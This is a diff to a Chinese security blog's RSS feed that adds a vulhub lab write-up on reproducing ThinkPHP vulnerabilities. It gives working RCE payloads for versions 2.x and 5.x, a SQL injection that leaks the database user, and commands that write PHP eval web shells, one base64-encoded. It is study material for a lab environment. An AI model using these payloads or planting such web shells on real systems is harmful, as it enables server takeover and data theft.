@@ -5,8 +5,8 @@
         <link>https://w-sqrt7.gitee.io</link>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Wed, 24 Apr 2024 10:46:27 +0800</pubDate>
-        <lastBuildDate>Wed, 24 Apr 2024 10:46:27 +0800</lastBuildDate>
+        <pubDate>Thu, 25 Apr 2024 00:11:39 +0800</pubDate>
+        <lastBuildDate>Thu, 25 Apr 2024 00:11:39 +0800</lastBuildDate>
         <category>原创</category>
         <category>逆向</category>
         <category>C语言</category>
@@ -24,6 +24,84 @@
         <category>kali</category>
         <category>靶场</category>
         <category>vulhub</category>
+        <item>
+            <guid isPermalink="true">https://w-sqrt7.gitee.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+            <title>【vulhub】ThinkPHP漏洞复现</title>
+            <link>https://w-sqrt7.gitee.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+            <category>原创</category>
+            <category>靶场</category>
+            <category>vulhub</category>
+            <pubDate>Thu, 25 Apr 2024 00:11:39 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;【vulhub】ThinkPHP漏洞复现&#34;&gt;&lt;a href=&#34;#【vulhub】ThinkPHP漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;【vulhub】ThinkPHP漏洞复现&#34;&gt;&lt;/a&gt;【vulhub】ThinkPHP漏洞复现&lt;/h1&gt;&lt;p&gt;​	PHP框架是许多代码的集合，这些代码是程序结构的代码(并不是业务代码)，代码中有许多函数、类、功能类包，框架的代码按照一定标准组成了一个有机的功能体，这个功能体中有许多设计模式如MVC、单例、AR等。&lt;br&gt;​	ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，是一个轻量级框架，内部OOP和面向过程代码都存在，是国人自己开发的框架。同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib、RoR的ORM映射和ActiveRecord模式。&lt;/p&gt;
+&lt;h1 id=&#34;2-rce&#34;&gt;&lt;a href=&#34;#2-rce&#34; class=&#34;headerlink&#34; title=&#34;2-rce&#34;&gt;&lt;/a&gt;2-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：&#34;&gt;&lt;a href=&#34;#漏洞原理：&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP 2.x版本中，使用&lt;code&gt;preg_replace&lt;/code&gt;的&lt;code&gt;/e&lt;/code&gt;模式匹配路由：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;@(\w+)&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$depr&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;([^&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$depr&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;\/]+)@e&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;$var[\&amp;#x27;\\1\&amp;#x27;]=&amp;quot;\\2&amp;quot;;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;title function_ invoke__&#34;&gt;implode&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$depr&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$paths&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。&lt;/p&gt;
+&lt;p&gt;ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。&lt;/p&gt;
+&lt;p&gt;具体原理过程参考文章：&lt;a href=&#34;https://www.freebuf.com/sectool/223149.html%EF%BC%88%E5%BC%BA%E7%83%88%E6%8E%A8%E8%8D%90%E7%9C%8B%E5%AE%8C%EF%BC%81%EF%BC%89&#34;&gt;https://www.freebuf.com/sectool/223149.html（强烈推荐看完！）&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现：&#34;&gt;&lt;a href=&#34;#漏洞复现：&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;根据对漏洞原理的理解，构造payload，获取phpinfo信息&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=a/b/c/$&amp;#123;phpinfo()&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170222558.png&#34; alt=&#34;image-20240424170222558&#34;&gt;&lt;/p&gt;
+&lt;p&gt;构造payload，配合蚁剑等工具进行连接，获取shell&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=a/b/c/$&amp;#123;@print(eval($_POST[sqrt7]))&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170623602.png&#34; alt=&#34;image-20240424170623602&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170654949.png&#34; alt=&#34;image-20240424170654949&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;5-0-23-rce&#34;&gt;&lt;a href=&#34;#5-0-23-rce&#34; class=&#34;headerlink&#34; title=&#34;5.0.23-rce&#34;&gt;&lt;/a&gt;5.0.23-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-1&#34;&gt;&lt;a href=&#34;#漏洞原理：-1&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。&lt;/p&gt;
+&lt;p&gt;实现框架的核心类Requests的method方法实现表单请求类伪装，默认为$_POST[‘_method’]变量，却没有对_method属性进行严格校验，可以通过变量覆盖Requests类的属性，在结合框架特性实现对任意函数的调用实现任意代码执行&lt;/p&gt;
+&lt;p&gt; 影响版本&lt;/p&gt;
+&lt;p&gt;ThinkPHP 5.0.x&lt;del&gt;5.0.23&lt;br&gt;ThinkPHP 5.1.x&lt;/del&gt;5.1.31&lt;br&gt;ThinkPHP 5.2.0beta1&lt;/p&gt;
+&lt;p&gt;具体原理参考文章：（需要一定的基础）&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/solitudi/article/details/113796433&#34;&gt;https://blog.csdn.net/solitudi/article/details/113796433&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现：-1&#34;&gt;&lt;a href=&#34;#漏洞复现：-1&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;BP抓包修改数据，执行命令，获取信息&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?s=captcha&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-24%20191819.png&#34; alt=&#34;屏幕截图 2024-04-24 191819&#34;&gt;&lt;/p&gt;
+&lt;p&gt;尝试创建后门，利用蚁剑进行连接&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?s=captcha&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=echo &amp;quot;&amp;lt;?php @eval(\$_POST[sqrt7])?&amp;gt;&amp;quot; &amp;gt;&amp;gt; sqrt.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=echo &amp;quot;PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pPz4=&amp;quot;|base64 -d &amp;gt;&amp;gt; sqrt.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424192934769.png&#34; alt=&#34;image-20240424192934769&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;5-rce&#34;&gt;&lt;a href=&#34;#5-rce&#34; class=&#34;headerlink&#34; title=&#34;5-rce&#34;&gt;&lt;/a&gt;5-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-2&#34;&gt;&lt;a href=&#34;#漏洞原理：-2&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。&lt;/p&gt;
+&lt;p&gt;影响版本&lt;/p&gt;
+&lt;p&gt;ThinkPHP5:&lt;br&gt;5.0.x&lt;del&gt;5.0.23；&lt;br&gt;5.1.0&lt;/del&gt;5.1.30；&lt;br&gt;不同版本payload不同， 5.1.13之后还与debug模式有关&lt;/p&gt;
+&lt;p&gt;具体原理参考文章：（需要一定的基础）&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/289860.html&#34;&gt;https://www.freebuf.com/articles/web/289860.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现：-2&#34;&gt;&lt;a href=&#34;#漏洞复现：-2&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;构造payload，执行命令&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=-1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230451281.png&#34; alt=&#34;image-20240424230451281&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230509901.png&#34; alt=&#34;image-20240424230509901&#34;&gt;&lt;/p&gt;
+&lt;p&gt;尝试写入后门木马进行连接&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=file_put_contents&amp;amp;vars[1][]=shell.php&amp;amp;vars[1][1]=&amp;#x27;&amp;lt;?php phpinfo();eval($_REQUEST[7]);?&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload解释：调用file_put_contents方法将&amp;#x27;&amp;lt;?php phpinfo();eval($_REQUEST[7]);?&amp;gt;&amp;#x27;写入shell.php文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424231120979.png&#34; alt=&#34;image-20240424231120979&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;in-sqlinjection&#34;&gt;&lt;a href=&#34;#in-sqlinjection&#34; class=&#34;headerlink&#34; title=&#34;in-sqlinjection&#34;&gt;&lt;/a&gt;in-sqlinjection&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-3&#34;&gt;&lt;a href=&#34;#漏洞原理：-3&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP5 SQL注入漏洞 &amp;amp;&amp;amp; 敏感信息泄露&lt;/p&gt;
+&lt;p&gt;传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。&lt;/p&gt;
+&lt;p&gt;重点还是在于通过敏感信息泄露进一步的利用，sql注入漏洞起到的作用只体现在爆出敏感信息。&lt;/p&gt;
+&lt;p&gt;影响版本&lt;br&gt;ThinkPHP &amp;lt; 5.1.23&lt;br&gt;该漏洞的形成最关键一点是需要开启debug模式&lt;/p&gt;
+&lt;p&gt;具体原理参考文章：（需要一定的基础）&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&#34;&gt;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现：-3&#34;&gt;&lt;a href=&#34;#漏洞复现：-3&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134/index.php?ids[]=1&amp;amp;ids[]=2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424234654144.png&#34; alt=&#34;image-20240424234654144&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424235410605.png&#34; alt=&#34;image-20240424235410605&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;lang-rce&#34;&gt;&lt;a href=&#34;#lang-rce&#34; class=&#34;headerlink&#34; title=&#34;lang-rce&#34;&gt;&lt;/a&gt;lang-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-4&#34;&gt;&lt;a href=&#34;#漏洞原理：-4&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;参考文章：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Yeoman92/article/details/53064670&#34;&gt;https://blog.csdn.net/Yeoman92/article/details/53064670&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/sectool/223149.html&#34;&gt;https://www.freebuf.com/sectool/223149.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/solitudi/article/details/113796433&#34;&gt;https://blog.csdn.net/solitudi/article/details/113796433&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/289860.html&#34;&gt;https://www.freebuf.com/articles/web/289860.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&#34;&gt;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_51922767/article/details/126859373&#34;&gt;https://blog.csdn.net/qq_51922767/article/details/126859373&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_42253265/article/details/111593955&#34;&gt;https://blog.csdn.net/weixin_42253265/article/details/111593955&lt;/a&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://w-sqrt7.gitee.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
             <title>【vulhub】Tomcat漏洞复现</title>
